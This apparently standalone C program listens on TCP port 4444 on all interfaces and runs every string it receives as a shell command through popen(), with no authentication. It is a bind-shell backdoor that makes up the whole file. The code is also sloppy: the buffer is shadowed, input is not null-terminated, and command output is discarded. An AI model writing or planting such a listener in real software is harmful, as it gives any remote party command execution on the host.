#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int main(void) {
    int listen_socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = 0;
    address.sin_port = htons(4444);

    int address_size = sizeof(address);

    bind(listen_socket_fd, (struct sockaddr *) &address, address_size);
    listen(listen_socket_fd, 3);

    while(1) {
        puts("Listening...");

        int accept_socket_fd = accept(listen_socket_fd, (struct sockaddr *) &address, &address_size);
        char buffer[1024];

        while(1) {
            char buffer[1024];
            recv(accept_socket_fd, buffer, 1024, 0);
            popen(buffer, "r");
            memset(buffer, 0, 1024);
        }
    }
}
